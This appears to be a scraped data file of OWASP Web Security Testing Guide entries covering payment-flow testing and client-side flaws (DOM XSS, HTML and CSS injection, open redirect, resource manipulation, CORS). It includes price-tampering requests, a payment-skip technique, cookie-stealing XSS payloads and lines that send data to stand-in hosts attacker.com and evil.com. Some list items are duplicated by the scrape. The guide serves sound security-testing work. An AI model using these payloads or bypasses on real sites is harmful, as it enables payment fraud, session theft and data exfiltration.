differences in the attack surface and risk profile of each approach, there is also a significant difference in the number of requirements between SAQ A (22 requirements) and SAQ D (329 requirements) that the organization needs to meet. As such, it’s worth highlighting applications that are not using an redirect or IFRAME, as they represent increased technical and compliance risks.</p><p>Most e-commerce sites allow users to add items to a basket before they start the checkout process. This basket should keep track of which items that have been added, and the quantity of each item. The quantity should normally be a positive integer, but if the site does not properly validate this then it may be possible to specify a decimal quantity of an item (such as 0.1 ), or a negative quantity (such as -1 ). Depending on the backend processing, adding negative quantities of an item may result in a negative value, reducing the overall cost of the basket.</p><p>There are usually multiple ways to modify the contents of the basket that should be tested, such as:</p><ul><li>Adding a negative quantity of an item.</li><li>Repeatedly removing items until the quantity is negative.</li><li>Updating the quantity to a negative value.</li></ul><p>Some sites may also provide a drop-down menu of valid quantities (such as items that must be bought in packs of 10), and it may be possible to tamper these requests to add other quantities of items.</p><p>If the full basket details are passed to the payment gateway (rather than simply passing a total value), it may also be possible to tamper the values at that stage.</p><p>Finally, if the application is vulnerable to HTTP parameter pollution then it may be possible to cause unexpected behavior by passing a parameter multiple times, such as:</p><pre><code>POST /api/basket/add\nHost: example.org\n\nitem_id=1&quantity=5&quantity=4</code></pre><p>When adding an item to the basket, the application should only include the item and a quantity, such as the example request below:</p><pre><code>POST /api/basket/add HTTP / 1.1 Host : example.org item_id=1&quantity=5</code></pre><p>However, in some cases the application may also include the price, meaning that it may be possible to tamper it:</p><pre><code>POST /api/basket/add HTTP / 1.1 Host : example.org item_id=1&quantity=5&price=2.00</code></pre><p>Different types of items may have different validation rules, so each type needs to be separately tested. Some applications also allow users to add an optional donation to charity as part of their purchase, and this donation can usually be an arbitrary amount. If this amount is not validated, it may be possible to add a negative donation amount, which would then reduce the total value of the basket.</p><p>If the checkout process is performed on a third-party payment gateway, then it may be possible to tamper with the prices between the application and the gateway.</p><p>The transfer to the gateway may be performed using a cross-domain POST to the gateway, as shown in the HTML example below.</p><p>Note: The card details are not included in this request - the user will be prompted for them on the payment gateway:</p><pre><code><form action= \"https://example.org/process_payment\" method= \"POST\" > <input type= \"hidden\" id= \"merchant_id\" value= \"123\" /> <input type= \"hidden\" id= \"basket_id\" value= \"456\" /> <input type= \"hidden\" id= \"item_id\" value= \"1\" /> <input type= \"hidden\" id= \"item_quantity\" value= \"5\" /> <input type= \"hidden\" id= \"item_total\" value= \"20.00\" /> <input type= \"hidden\" id= \"shipping_total\" value= \"2.00\" /> <input type= \"hidden\" id= \"basket_total\" value= \"22.00\" /> <input type= \"hidden\" id= \"currency\" value= \"GBP\" /> <input type= \"submit\" id= \"submit\" value= \"submit\" /> </form></code></pre><p>By modifying the HTML form or intercepting the POST request, it may be possible to modify the prices of items, and to effectively purchase them for less. Note that many payment gateways will reject a transaction with a value of zero, so a total of 0.01 is more likely to succeed. However, some payment gateways may accept negative values (used to process refunds). Where there are multiple values (such as item prices, a shipping cost, and the total basket cost), all of these should be tested.</p><p>If the payment gateway uses an IFRAME instead, it may be possible to perform a similar type of attack by modifying the IFRAME URL:</p><pre><code><iframe src= \"https://example.org/payment_iframe?merchant_id=123&basket_total=22.00\" /></code></pre><p>Note: Payment gateways are usually run by a third-parties, and as such may not be included in the scope of testing. This means that while price tampering may be acceptable, other types of attacks (such as SQL injection) should not be performed without explicit written approval).</p><p>In order to prevent the transaction being tampered with, some payment gateways will encrypt the details of the request that is made to them. For example, PayPal does this using public key cryptography.</p><p>The first thing to try is making an unencrypted request, as some payment gateways allow insecure transactions unless they have been specifically configured to reject them.</p><p>If this doesn’t work, then you need to find the public key that is used to encrypt the transaction details, which could be exposed in a backup of the application, or if you can find a directory traversal vulnerability.</p><p>Alternatively, it’s possible that the application re-uses the same public/private key pair for the payment gateway and its digital certificate. You can obtain the public key from the server with the following command:</p><pre><code>echo -e '\\0' | openssl s_client -connect example.org:443 2>/dev/null | openssl x509 -pubkey -noout</code></pre><p>Once you have this key, you can then try and create an encrypted request (based on the payment gateway’s documentation), and submit it to the gateway to see if it’s accepted.</p><p>Other payment gateways use a secure hash (or a HMAC) of the transaction details to prevent tampering. The exact details of how this is done will vary between providers (for example, Adyen uses HMAC-SHA256), but it will normally include the details of the transaction and a secret value. For example, a hash may be calculated as:</p><pre><code>$secure_hash = md5 ( $merchant_id . $transaction_id . $items . $total_value . $secret )</code></pre><p>This value is then added to the POST request that is sent to the payment gateway, and verified to ensure that the transaction hasn’t been tampered with.</p><p>The first thing to try is removing the secure hash, as some payment gateways allow insecure transactions unless a specific configuration option has been set.</p><p>The POST request should contain all of the values required to calculate this hash, other than the secret key. This means that if you know how the hash is calculated (which should be included in the payment gateway’s documentation), then you can attempt to brute-force the secret. Alternatively, if the site is running an off-the-shelf application, there may be a default secret in the configuration files or source code. Finally, if you can find a backup of the site, or otherwise gain access to the configuration files, you may be able to find the secret there.</p><p>If you can obtain this secret, you can then tamper the transaction details, and then generate your own secure hash which will be accepted by the payment gateway.</p><p>If it’s not possible to tamper with the actual prices, it may be possible to change the currency that is used, especially where applications support multiple currencies. For example, the application may validate that the price is 10, but if you can change the currency so that you pay 10 USD rather than 10 GBP, this would allow you to purchase items more cheaply.</p><p>If the value of items on the site changes over time (for example on a currency exchange), then it may be possible to buy or sell at an old price by intercepting requests using a local proxy and delaying them. In order for this to be exploitable, the price would need to either be included in the request, or linked to something in the request (such as session or transaction ID). The example below shows how this could potentially be exploited on a application that allows users to buy and sell gold:</p><ul><li>View the current price of gold on the site.</li><li>Initiate a buy request for 1oz of gold.</li><li>Intercept and freeze the request.</li><li>Wait one minutes to check the price of gold again:If it increases, allow the transaction to complete, and buy the gold for less than it’s current value.If it decreases, drop the request request.</li><li>If it increases, allow the transaction to complete, and buy the gold for less than it’s current value.</li><li>If it decreases, drop the request request.</li></ul><ul><li>If it increases, allow the transaction to complete, and buy the gold for less than it’s current value.</li><li>If it decreases, drop the request request.</li></ul><p>If the site allows the user to make payments using cryptocurrencies (which are usually far more volatile), it may be possible to exploit this by obtaining a fixed price in that cryptocurrency, and then waiting to see if the value rises or falls compared to the main currency used by the site.</p><p>If the application supports discount codes, then there are various checks that should be carried out:</p><ul><li>Are the codes easily guessable (TEST, TEST10, SORRY, SORRY10, company name, etc)?If a code has a number in, can more codes be found by increasing the number?</li><li>If a code has a number in, can more codes be found by increasing the number?</li><li>Is there any brute-force protection?</li><li>Can multiple discount codes be applied at once?</li><li>Can discount codes be applied multiple times?</li><li>Can youinject wildcard characterssuch as%or*?</li><li>Are discount codes exposed in the HTML source or hidden<input>fields anywhere on the application?</li></ul><ul><li>If a code has a number in, can more codes be found by increasing the number?</li></ul><p>In addition to these, the usual vulnerabilities such as SQL injection should be tested for.</p><p>If the checkout or payment process on an application involves multiple stages (such as adding items to a basket, entering discount codes, entering shipping details, and entering billing information), then it may be possible to cause unintended behavior by performing these steps outside of the expected sequence. For example, you could try:</p><ul><li>Modifying the shipping address after the billing details have been entered to reduce shipping costs.</li><li>Removing items after entering shipping details, to avoid a minimum basket value.</li><li>Modifying the contents of the basket after applying a discount code.</li><li>Modifying the contents of a basket after completing the checkout process.</li></ul><p>It may also be possible to skip the entire payment process for the transaction. For example, if the application redirects to a third-party payment gateway, the payment flow may be:</p><ul><li>The user enters details on the application.</li><li>The user is redirected to the third-party payment gateway.</li><li>The user enters their card details.If the payment is successful, they are redirected tosuccess.phpon the application.If the payment is unsuccessful, they are redirected tofailure.phpon the application</li><li>If the payment is successful, they are redirected tosuccess.phpon the application.</li><li>If the payment is unsuccessful, they are redirected tofailure.phpon the application</li><li>The application updates its order database, and processes the order if it was successful.</li></ul><ul><li>If the payment is successful, they are redirected tosuccess.phpon the application.</li><li>If the payment is unsuccessful, they are redirected tofailure.phpon the application</li></ul><p>Depending on whether the application actually validates that the payment on the gateway was successful, it may be possible to force-browse to the success.php page (possibly including a transaction ID if one is required), which would cause the site to process the order as though the payment was successful. Additionally, it may be possible to make repeated requests to the success.php page to cause an order to be processed multiple times.</p><p>Merchants normally have to pay fees for every transaction processed, which are typically made up of a small fixed fee, and a percentage of the total value. This means that receiving very small payments (such as $0.01) may result in the merchant actually losing money, as the transaction processing fees are greater than the total value of the transaction.</p><p>This issue is rarely exploitable on e-commerce sites, as the price of the cheapest item is usually high enough to prevent it. However, if the site allows customers to make payments with arbitrary amounts (such as donations), check that it enforces a sensible minimum value.</p><p>Most payment gateways have a set of defined test card details, which can be used by developers during testing and debugging. These should only be usable on development or sandbox versions of the gateways, but may be accepted on live sites if they have been misconfigured.</p><p>Examples of these test details for various payment gateways are listed below:</p><ul><li>Adyen - Test Card Numbers</li><li>Globalpay - Test Cards</li><li>Stripe - Basic Test Card Numbers</li></ul><p>Testing payment functionality on applications can introduce additional complexity, especially if a live site is being tested. Areas that need to be considered include:</p><ul><li>Obtaining test card payment details for the application.If these are not available, then it may be possible to obtain a pre-paid card or an alternative.</li><li>If these are not available, then it may be possible to obtain a pre-paid card or an alternative.</li><li>Keeping a record of any orders that are made so that they can be cancelled and refunded.</li><li>Not placing orders that can’t be cancelled, or that will cause other actions (such as goods being immediately dispatched from a warehouse).</li></ul><ul><li>If these are not available, then it may be possible to obtain a pre-paid card or an alternative.</li></ul><h3>Related Test Cases</h3><ul><li>Testing for HTTP Parameter Pollution</li><li>Testing for SQL Injection</li><li>Testing for the Circumvention of Work Flows</li></ul>",
        "tools": "",
        "remediation": "<h3>Remediation</h3><ul><li>Avoid storing, transmitting or processing card details wherever possible.Use a redirect or IFRAME for the payment gateway.</li><li>Use a redirect or IFRAME for the payment gateway.</li><li>Review payment gateway documentation and use all available security features (such as encryption and secure hashes).</li><li>Handle all pricing related information on server-side:The only things included in client-side requests should be item IDs and quantities.</li><li>The only things included in client-side requests should be item IDs and quantities.</li><li>Implement appropriate input validation and business logic constraints (such as checking for negative item numbers or values).</li><li>Ensure that application payment flow is robust and that steps can’t be performed out of sequence.</li></ul><ul><li>Use a redirect or IFRAME for the payment gateway.</li></ul><ul><li>The only things included in client-side requests should be item IDs and quantities.</li></ul><h3>References</h3><ul><li>Payment Card Industry Data Security Standard (PCI DSS)</li><li>Visa Processing E-Commerce Payments guidance</li></ul>",
        "test_objectives": ""
    },
    "WSTG-CLNT-01": {
        "summary": "<h3>Summary</h3><p>DOM-based cross-site scripting is the de-facto name for XSS bugs that are the result of active browser-side content on a page, typically JavaScript, obtaining user input through a source and using it in a sink , leading to the execution of injected code. This document only discusses JavaScript bugs which lead to XSS.</p><p>The DOM, or Document Object Model , is the structural format used to represent documents in a browser. The DOM enables dynamic scripts such as JavaScript to reference components of the document such as a form field or a session cookie. The DOM is also used by the browser for security - for example to limit scripts on different domains from obtaining session cookies for other domains. A DOM-based XSS vulnerability may occur when active content, such as a JavaScript function, is modified by a specially crafted request such that a DOM element that can be controlled by an attacker.</p><p>Not all XSS bugs require the attacker to control the content returned from the server, but can instead abuse poor JavaScript coding practices to achieve the same results. The consequences are the same as a typical XSS flaw, only the means of delivery is different.</p><p>In comparison to other types of cross site scripting vulnerabilities ( reflected and stored , where an un-sanitized parameter is passed by the server then returned to the user and executed in the context of the user’s browser, a DOM-based XSS vulnerability controls the flow of the code by using elements of the Document Object Model (DOM) along with code crafted by the attacker to change the flow.</p><p>Due to their nature, DOM-based XSS vulnerabilities can be executed in many instances without the server being able to determine what is actually being executed. This may make many of the general XSS filtering and detection techniques impotent to such attacks.</p><p>This hypothetical example uses the following client-side code:</p><pre><code><script> document . write ( \" Site is at: \" + document . location . href + \" . \" ); </script></code></pre><p>An attacker may append #<script>alert('xss')</script> to the affected page URL which would, when executed, display the alert box. In this instance, the appended code would not be sent to the server as everything after the # character is not treated as part of the query by the browser, but as a fragment. In this example, the code is immediately executed and an alert of “xss” is displayed by the page. Unlike the more common types of cross site scripting ( reflected and stored in which the code is sent to the server and then back to the browser, this is executed directly in the user’s browser without server contact.</p><p>The consequences of DOM-based XSS flaws are as wide ranging as those seen in more well known forms of XSS, including cookie retrieval, further malicious script injection, etc., and should therefore be treated with the same severity.</p><h3>Test Objectives</h3><ul><li>Identify DOM sinks.</li><li>Build payloads that pertain to every sink type.</li></ul>",
        "how-to": "<h3>How to Test</h3><p>JavaScript applications differ significantly from other types of applications because they are often dynamically generated by the server. To understand what code is being executed, the website being tested needs to be crawled to determine all the instances of JavaScript being executed and where user input is accepted. Many websites rely on large libraries of functions, which often stretch into the hundreds of thousands of lines of code and have not been developed in-house. In these cases, top-down testing often becomes the only viable option, since many bottom level functions are never used, and analyzing them to determine which are sinks will use up more time than is often available. The same can also be said for top-down testing if the inputs or lack thereof is not identified to begin with.</p><p>User input comes in two main forms:</p><ul><li>Input written to the page by the server in a way that does not allow direct XSS, and</li><li>Input obtained from client-side JavaScript objects.</li></ul><p>Here are two examples of how the server may insert data into JavaScript:</p><pre><code>var data = \" <escaped data from the server> \" ; var result = someFunction ( \" <escaped data from the server> \" );</code></pre><p>Here are two examples of input from client-side JavaScript objects:</p><pre><code>var data = window . location ; var result = someFunction ( window . referrer );</code></pre><p>While there is little difference to the JavaScript code in how they are retrieved, it is important to note that when input is received via the server, the server can apply any permutations to the data that it desires. On the other hand, the permutations performed by JavaScript objects are fairly well understood and documented. If someFunction in the above example were a sink, then the exploitability in the former case would depend on the filtering done by the server, whereas in the latter case it would depend on the encoding done by the browser on the window.referrer object. Stefano Di Paulo has written an excellent article on what browsers return when asked for the various elements of a URL using the document and location attributes .</p><p>Additionally, JavaScript is often executed outside of <script> blocks, as evidenced by the many vectors which have led to XSS filter bypasses in the past. When crawling the application, it is important to note the use of scripts in places such as event handlers and CSS blocks with expression attributes. Also, note that any off-site CSS or script objects will need to be assessed to determine what code is being executed.</p><p>Automated testing has only very limited success at identifying and validating DOM-based XSS as it usually identifies XSS by sending a specific payload and attempts to observe it in the server response. This may work fine for the simple example provided below, where the message parameter is reflected back to the user:</p><pre><code><script> var pos = document . URL . indexOf ( \" message= \" ) + 5 ; document . write ( document . URL . substring ( pos , document . URL . length )); </script></code></pre><p>However, it may not be detected in the following contrived case:</p><pre><code><script> var navAgt = navigator . userAgent ; if ( navAgt . indexOf ( \" MSIE \" ) !=- 1 ) { document . write ( \" You are using IE as a browser and visiting site: \" + document . location . href + \" . \" ); } else { document . write ( \" You are using an unknown browser. \" ); } </script></code></pre><p>For this reason, automated testing will not detect areas that may be susceptible to DOM-based XSS unless the testing tool can perform additional analysis of the client-side code.</p><p>Manual testing should therefore be undertaken and can be done by examining areas in the code where parameters are referred to that may be useful to an attacker. Examples of such areas include places where code is dynamically written to the page and elsewhere where the DOM is modified or even where scripts are directly executed.</p>",
        "tools": "",
        "remediation": "<h3>Remediation</h3><p>For measures to prevent DOM-based XSS, see the DOM-based XSS Prevention Cheat Sheet .</p><h3>References</h3><ul><li>DomXSSWiki</li></ul>",
        "test_objectives": ""
    },
    "WSTG-CLNT-02": {
        "summary": "<h3>Summary</h3><p>A JavaScript injection vulnerability is a subtype of cross site scripting (XSS) that involves the ability to inject arbitrary JavaScript code that is executed by the application inside the victim’s browser. This vulnerability can have many consequences, like the disclosure of a user’s session cookies that could be used to impersonate the victim, or, more generally, it can allow the attacker to modify the page content seen by the victims or the application’s behavior.</p><p>JavaScript injection vulnerabilities can occur when the application lacks proper user-supplied input and output validation. As JavaScript is used to dynamically populate web pages, this injection occurs during this content processing phase and consequently affects the victim.</p><p>When testing for this vulnerability, consider that some characters are treated differently by different browsers. For reference, see DOM-based XSS .</p><p>Here is an example of a script that does not perform any validation of the variable rr . The variable contains user-supplied input via the query string, and additionally does not apply any form of encoding:</p><pre><code>var rr = location . search . substring ( 1 ); if ( rr ) { window . location = decodeURIComponent ( rr ); }</code></pre><p>This implies that an attacker could inject JavaScript code simply by submitting the following query string: www.victim.com/?javascript:alert(1) .</p><h3>Test Objectives</h3><ul><li>Identify sinks and possible JavaScript injection points.</li></ul>",
        "how-to": "<h3>How to Test</h3><p>Consider the following: DOM XSS exercise</p><p>The page contains the following script:</p><pre><code><script> function loadObj (){ var cc = eval ( ' ( ' + aMess + ' ) ' ); document . getElementById ( ' mess ' ). textContent = cc . message ; } if ( window . location . hash . indexOf ( ' message ' ) ==- 1 ) { var aMess = ' ({\"message\":\"Hello User!\"}) ' ; } else { var aMess = location . hash . substr ( window . location . hash . indexOf ( ' message= ' ) + 8 ) } </script></code></pre><p>The above code contains a source location.hash that is controlled by the attacker that can inject directly in the message value a JavaScript Code to take the control of the user browser.</p>",
        "tools": "",
        "remediation": "",
        "test_objectives": ""
    },
    "WSTG-CLNT-03": {
        "summary": "<h3>Summary</h3><p>HTML injection is a type of injection vulnerability that occurs when a user is able to control an input point and is able to inject arbitrary HTML code into a vulnerable web page. This vulnerability can have many consequences, like disclosure of a user’s session cookies that could be used to impersonate the victim, or, more generally, it can allow the attacker to modify the page content seen by the victims.</p><p>This vulnerability occurs when user input is not correctly sanitized and the output is not encoded. An injection allows the attacker to send a malicious HTML page to a victim. The targeted browser will not be able to distinguish (trust) legitimate parts from malicious parts of the page, and consequently will parse and execute the whole page in the victim’s context.</p><p>There is a wide range of methods and attributes that could be used to render HTML content. If these methods are provided with an untrusted input, then there is an high risk of HTML injection vulnerability. For example, malicious HTML code can be injected via the innerHTML JavaScript method, usually used to render user-inserted HTML code. If strings are not correctly sanitized, the method can enable HTML injection. A JavaScript function that can be used for this purpose is document.write() .</p><p>The following example shows a snippet of vulnerable code that allows an unvalidated input to be used to create dynamic HTML in the page context:</p><pre><code>var userposition = location . href . indexOf ( \" user= \" ); var user = location . href . substring ( userposition + 5 ); document . getElementById ( \" Welcome \" ). innerHTML = \" Hello, \" + user ;</code></pre><p>The following example shows vulnerable code using the document.write() function:</p><pre><code>var userposition = location . href . indexOf ( \" user= \" ); var user = location . href . substring ( userposition + 5 ); document . write ( \" <h1>Hello, \" + user + \" </h1> \" );</code></pre><p>In both examples, this vulnerability can be exploited with an input such as:</p><pre><code>https://vulnerable.site/page.html?user=<img%20src='aaa'%20onerror=alert(1)></code></pre><p>This input will add an image tag to the page that will execute arbitrary JavaScript code inserted by the malicious user in the HTML context.</p><h3>Test Objectives</h3><ul><li>Identify HTML injection points and assess the severity of the injected content.</li></ul>",
        "how-to": "<h3>How to Test</h3><p>Consider the following DOM XSS exercise https://www.domxss.com/domxss/01_Basics/06_jquery_old_html.html</p><p>The HTML code contains the following script:</p><pre><code><script src= \"../js/jquery-1.7.1.js\" ></script> <script> function setMessage (){ var t = location . hash . slice ( 1 ); $ ( \" div[id= \" + t + \" ] \" ). text ( \" The DOM is now loaded and can be manipulated. \" ); } $ ( document ). ready ( setMessage ); $ ( window ). bind ( \" hashchange \" , setMessage ) </script> <body> <script src= \"../js/embed.js\" ></script> <span><a href= \"#message\" > Show Here </a><div id= \"message\" > Showing Message1 </div></span> <span><a href= \"#message1\" > Show Here </a><div id= \"message1\" > Showing Message2 </div> <span><a href= \"#message2\" > Show Here </a><div id= \"message2\" > Showing Message3 </div> </body></code></pre><p>It is possible to inject HTML code.</p>",
        "tools": "",
        "remediation": "",
        "test_objectives": ""
    },
    "WSTG-CLNT-04": {
        "summary": "<h3>Summary</h3><p>This section describes how to check for client-side URL redirection, also known as open redirection. It is an input validation flaw that exists when an application accepts user-controlled input that specifies a link which leads to an external URL that could be malicious. This kind of vulnerability could be used to accomplish a phishing attack or redirect a victim to an infection page.</p><p>This vulnerability occurs when an application accepts untrusted input that contains a URL value and does not sanitize it. This URL value could cause the web application to redirect the user to another page, such as a malicious page controlled by the attacker.</p><p>This vulnerability may enable an attacker to successfully launch a phishing scam and steal user credentials. Since the redirection is originated by the real application, the phishing attempts may have a more trustworthy appearance.</p><p>Here is an example of a phishing attack URL.</p><pre><code>https://www.target.site?#redirect=www.fake-target.site</code></pre><p>The victim that visits this URL will be automatically redirected to fake-target.site , where an attacker could place a fake page that resembles the intended site, in order to steal the victim’s credentials.</p><p>Open redirection could also be used to craft a URL that would bypass the application’s access control checks and forward the attacker to privileged functions that they would normally not be able to access.</p><h3>Test Objectives</h3><ul><li>Identify injection points that handle URLs or paths.</li><li>Assess the locations that the system could redirect to.</li></ul>",
        "how-to": "<h3>How to Test</h3><p>When testers manually check for this type of vulnerability, they first identify if there are client-side redirections implemented in the client-side code. These redirections may be implemented, to give a JavaScript example, using the window.location object. This can be used to direct the browser to another page by simply assigning a string to it. This is demonstrated in the following snippet:</p><pre><code>var redir = location . hash . substring ( 1 ); if ( redir ) { window . location = ' https:// ' + decodeURIComponent ( redir ); }</code></pre><p>In this example, the script does not perform any validation of the variable redir which contains the user-supplied input via the query string. Since no form of encoding is applied, this unvalidated input is passed to the windows.location object, creating a URL redirection vulnerability.</p><p>This implies that an attacker could redirect the victim to a malicious site simply by submitting the following query string:</p><pre><code>https://www.victim.site/?#www.malicious.site</code></pre><p>With a slight modification, the above example snippet can be vulnerable to JavaScript injection.</p><pre><code>var redir = location . hash . substring ( 1 ); if ( redir ) { window . location = decodeURIComponent ( redir ); }</code></pre><p>This can be exploited by submitting the following query string:</p><pre><code>https://www.victim.site/?#javascript:alert(document.cookie)</code></pre><p>When testing for this vulnerability, consider that some characters are treated differently by different browsers. For reference, see DOM-based XSS .</p>",
        "tools": "",
        "remediation": "",
        "test_objectives": ""
    },
    "WSTG-CLNT-05": {
        "summary": "<h3>Summary</h3><p>A CSS Injection vulnerability involves the ability to inject arbitrary CSS code in the context of a trusted web site which is rendered inside a victim’s browser. The impact of this type of vulnerability varies based on the supplied CSS payload. It may lead to cross site scripting or data exfiltration.</p><p>This vulnerability occurs when the application allows user-supplied CSS to interfere with the application’s legitimate style sheets. Injecting code in the CSS context may provide an attacker with the ability to execute JavaScript in certain conditions, or to extract sensitive values using CSS selectors and functions able to generate HTTP requests. Generally, allowing users the ability to customize pages by supplying custom CSS files is a considerable risk.</p><p>The following JavaScript code shows a possible vulnerable script in which the attacker is able to control the location.hash (source) which reaches the cssText function (sink). This particular case may lead to DOM-based XSS in older browser versions; for more information, see the DOM-based XSS Prevention Cheat Sheet .</p><pre><code><a id= \"a1\" > Click me </a> <script> if ( location . hash . slice ( 1 )) { document . getElementById ( \" a1 \" ). style . cssText = \" color: \" + location . hash . slice ( 1 ); } </script></code></pre><p>The attacker could target the victim by asking them to visit the following URLs:</p><ul><li>www.victim.com/#red;-o-link:'<javascript:alert(1)>';-o-link-source:current;(Opera [8,12])</li><li>www.victim.com/#red;-:expression(alert(URL=1));(IE 7/8)</li></ul><p>The same vulnerability may appear in the case of reflected XSS, for example, in the following PHP code:</p><pre><code><style> p { color : <? php echo $ _GET [ 'color' ]; ?>; text-align : center ; } </style></code></pre><p>Further attack scenarios involve the ability to extract data through the adoption of pure CSS rules. Such attacks can be conducted through CSS selectors, leading to the exfiltration of data, for example, CSRF tokens.</p><p>Here is an example of code that attempts to select an input with a name matching csrf_token and a value beginning with an a . By utilizing a brute-force attack to determine the attribute’s value , it is possible to carry out an attack that sends the value to the attacker’s domain, such as by attempting to set a background image on the selected input element.</p><pre><code><style> input [ name = csrf_token ][ value =^ a ] { background-image : url(https://attacker.com/log?a) ; } </style></code></pre><p>Other attacks using solicited content such as CSS are highlighted in Mario Heiderich’s talk, “Got Your Nose” on YouTube.</p><h3>Test Objectives</h3><ul><li>Identify CSS injection points.</li><li>Assess the impact of the injection.</li></ul>",
        "how-to": "<h3>How to Test</h3><p>Code should be analyzed to determine if a user is permitted to inject content in the CSS context. Particularly, the way in which the website returns CSS rules on the basis of the inputs should be inspected.</p><p>The following is a basic example:</p><pre><code><a id= \"a1\" > Click me </a> <b> Hi </b> <script> $ ( \" a \" ). click ( function (){ $ ( \" b \" ). attr ( \" style \" , \" color: \" + location . hash . slice ( 1 )); }); </script></code></pre><p>The above code contains a source location.hash , controlled by the attacker, that can inject directly in the style attribute of an HTML element. As mentioned above, this may lead to different results depending on the browser in use and the supplied payload.</p><p>The following pages provide examples of CSS injection vulnerabilities:</p><ul><li>Password “cracker” via CSS and HTML5</li><li>JavaScript based attacks usingCSSStyleDeclarationwith unescaped input</li></ul><p>For further OWASP resources on preventing CSS injection, see the Securing Cascading Style Sheets Cheat Sheet .</p>",
        "tools": "",
        "remediation": "",
        "test_objectives": ""
    },
    "WSTG-CLNT-06": {
        "summary": "<h3>Summary</h3><p>A client-side resource manipulation vulnerability is an input validation flaw. It occurs when an application accepts user-controlled input that specifies the path of a resource such as the source of an iframe, JavaScript, applet, or the handler of an XMLHttpRequest. This vulnerability consists of the ability to control the URLs that link to some resources present in a web page. The impact of this vulnerability varies, and it is usually adopted to conduct XSS attacks. This vulnerability makes it is possible to interfere with the expected application’s behavior by causing it to load and render malicious objects.</p><p>The following JavaScript code shows a possible vulnerable script in which an attacker is able to control the location.hash (source) which reaches the attribute src of a script element. This particular case leads to a XSS attack as external JavaScript could be injected.</p><pre><code><script> var d = document . createElement ( \" script \" ); if ( location . hash . slice ( 1 )) { d . src = location . hash . slice ( 1 ); } document . body . appendChild ( d ); </script></code></pre><p>An attacker could target a victim by causing them to visit this URL:</p><p>www.victim.com/#https://evil.com/js.js</p><p>Where js.js contains:</p><pre><code>alert ( document . cookie )</code></pre><p>This would cause the alert to pop up on the victim’s browser.</p><p>A more damaging scenario involves the possibility of controlling the URL called in a CORS request. Since CORS allows the target resource to be accessible by the requesting domain through a header-based approach, the attacker may ask the target page to load malicious content from its own website.</p><p>Here is an example of a vulnerable page:</p><pre><code><b id= \"p\" ></b> <script> function createCORSRequest ( method , url ) { var xhr = new XMLHttpRequest (); xhr . open ( method , url , true ); xhr . onreadystatechange = function () { if ( this . status == 200 && this . readyState == 4 ) { document . getElementById ( ' p ' ). innerHTML = this . responseText ; } }; return xhr ; } var xhr = createCORSRequest ( ' GET ' , location . hash . slice ( 1 )); xhr . send ( null ); </script></code></pre><p>The location.hash is controlled by user input and is used for requesting an external resource, which will then be reflected through the construct innerHTML . An attacker could ask a victim to visit the following URL:</p><p>www.victim.com/#https://evil.com/html.html</p><p>With the payload handler for html.html :</p><pre><code><?php\nheader('Access-Control-Allow-Origin: https://www.victim.com');\n?> <script> alert ( document . cookie ); </script></code></pre><h3>Test Objectives</h3><ul><li>Identify sinks with weak input validation.</li><li>Assess the impact of the resource manipulation.</li></ul>",
        "how-to": "<h3>How to Test</h3><p>To manually check for this type of vulnerability, we must identify whether the application employs inputs without correctly validating them. If so, these inputs are under the control of the user and could be used to specify external resources. Since there are many resources that could be included in the application (such as images, video, objects, css, and iframes), the client-side scripts that handle the associated URLs should be investigated for potential issues.</p><p>The following table shows possible injection points (sink) that should be checked:</p><p>The most interesting ones are those that allow to an attacker to include client-side code (for example JavaScript) that could lead to XSS vulnerabilities.</p>",
        "tools": "",
        "remediation": "",
        "test_objectives": ""
    },
    "WSTG-CLNT-07": {
        "summary": "<h3>Summary</h3><p>Cross Origin Resource Sharing (CORS) is a mechanism that enables a web browser to perform cross-domain requests using the XMLHttpRequest (XHR) Level 2 (L2) API in a controlled manner. In the past, the XHR L1 API only allowed requests to be sent within the same origin as it was restricted by the Same Origin Policy (SOP).</p><p>Cross-origin requests have an Origin header that identifies the domain initiating the request and is always sent to the server. CORS defines the protocol to use between a web browser and a server to determine whether a cross-origin request is allowed. HTTP headers are used to accomplish this.</p><p>The W3C CORS specification mandates that for non simple requests, such as requests other than GET or POST or requests that uses credentials, a pre-flight OPTIONS request must be sent in advance to check if the type of request will have a bad impact on the data. The pre-flight request checks the methods and headers allowed by the server, and if credentials are permitted. Based on the result of the OPTIONS request, the browser decides whether the request is allowed or not.</p><p>The Origin request header is always sent by the browser in a CORS request and indicates the origin of the request. The Origin header cannot be changed from JavaScript as the browser (the user-agent) blocks its modification ; however, relying on this header for Access Control checks is not a good idea as it may be spoofed outside the browser, for example by using a proxy, so you still need to check that application-level protocols are used to protect sensitive data.</p><p>Access-Control-Allow-Origin is a response header used by a server to indicate which domains are allowed to read the response. Based on the CORS W3 Specification it is up to the client to determine and enforce the restriction of whether the client has access to the response data based on this header.</p><p>From a security testing perspective you should look for insecure configurations as for example using a * wildcard as value of the Access-Control-Allow-Origin header that means all domains are allowed. Another insecure example is when the server returns back the origin header without any additional checks, which can lead to access of sensitive data. Note that the configuration of allowing cross-origin requests is very insecure and is not acceptable in general terms, except in the case of a public API that is intended to be accessible by everyone.</p><p>The Access-Control-Request-Method header is used when a browser performs a preflight OPTIONS request and lets the client indicate the request method of the final request. On the other hand, the Access-Control-Allow-Method is a response header used by the server to describe the methods the clients are allowed to use.</p><p>These two headers are used between the browser and the server to determine which headers can be used to perform a cross-origin request.</p><p>This response header allows browsers to read the response when credentials are passed. When the header is sent, the web application must set an origin to the value of the Access-Control-Allow-Origin header. The Access-Control-Allow-Credentials header cannot be used along with the Access-Control-Allow-Origin header whose value is the * wildcard like the following:</p><pre><code>Access-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true</code></pre><p>XHR L2 introduces the possibility of creating a cross-domain request using the XHR API for backwards compatibility. This can introduce security vulnerabilities that in XHR L1 were not present. Interesting points of the code to exploit would be URLs that are passed to XMLHttpRequest without validation, specially if absolute URLs are allowed because that could lead to code injection. Likewise, other part of the application that can be exploited is if the response data is not escaped and we can control it by providing user-supplied input.</p><p>There are other headers involved like Access-Control-Max-Age that determines the time a preflight request can be cached in the browser, or Access-Control-Expose-Headers that indicates which headers are safe to expose to the API of a CORS API specification.</p><p>To review CORS headers, refer to the CORS MDN document .</p><h3>Test Objectives</h3><ul><li>Identify endpoints that implement CORS.</li><li>Ensure that the CORS configuration is secure or harmless.</li></ul>",
